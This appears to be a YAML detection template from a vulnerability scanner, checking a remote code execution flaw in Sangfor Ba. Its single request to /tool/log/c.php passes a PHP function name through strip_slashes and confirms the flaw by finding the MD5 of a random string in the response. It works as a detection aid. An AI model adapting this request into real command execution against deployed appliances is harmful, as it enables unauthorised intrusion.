id: poc-yaml-sangfor-ba-rce
info:
  name: Sangfor Ba 远程代码执行漏洞
  severity: medium
  tags:
  - rce
  finger: Sangfor Ba
  reference: []
  description: null
variables:
  r1: random_str(8)
transport: http
requests:
- method: GET
  path: /tool/log/c.php?strip_slashes=md5&host={{.r1}}
  headers: {}
  data: null
  redirect: false
  raw: null
  timeout: null
  expression: status_code == 200 && contains(headers, "content-type") && contains(headers,
    "text/html") && contains(body, md5(r1))
  output: []
